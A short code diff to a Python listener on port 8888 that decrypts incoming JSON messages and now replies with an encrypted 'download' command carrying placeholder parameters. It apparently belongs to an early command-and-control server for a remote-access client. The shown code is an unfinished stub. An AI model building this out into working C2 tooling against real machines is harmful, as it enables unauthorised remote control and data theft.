@@ -28,11 +28,21 @@ def main():
 
     print('Listening on port 8888...')
     while True:
-        data = listener.listen()
-        data = cipher.decrypt_message(data)
+        listen = listener.listen()
+        conn = listen["conn"]
+        data = cipher.decrypt_message(listen["data"])
         data = json.loads(data)
         if data is not None:
             print(data)
+            response = json.dumps({
+                'command': 'download',
+                'params': "params"
+            }).encode('utf-8')
+
+            # response = cipher.encrypt_message(f"Commands received: {data['command']}")
+            conn.sendall(cipher.encrypt_message(response))
+            # if data["commands"] == "download":
+
             # data = None
 
 
